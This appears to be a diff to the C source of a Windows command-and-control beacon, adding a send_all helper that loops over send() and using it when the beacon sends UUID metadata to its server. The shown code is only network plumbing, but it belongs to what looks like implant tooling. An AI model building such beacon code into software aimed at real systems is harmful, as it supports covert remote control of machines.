@@ -5,10 +5,24 @@
 #include <ws2tcpip.h>
 #include <rpcdce.h>
 #include <wincrypt.h>
+#include <stdbool.h>
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "rpcrt4.lib")
 
+
+BOOL send_all(int socket, void *buffer, size_t length)
+{
+    char *ptr = (char*) buffer;
+    while (length > 0)
+    {
+        int i = send(socket, ptr, length, 0);
+        if (i < 1) return false;
+        ptr += i;
+        length -= i;
+    }
+    return true;
+}
 
 
 
@@ -56,7 +70,7 @@ void beacon_connect_to_server(char IP[16], int PORT){
     //// Send metadata
     printf("\nSENDBUF\n");
     printf("\n%s\n", UUID_BUFFER);
-    send(s, UUID_BUFFER, (int)strlen(sendbuf), 0); 
+    send_all(s, UUID_BUFFER, (int)strlen(sendbuf)); 
   
     
     
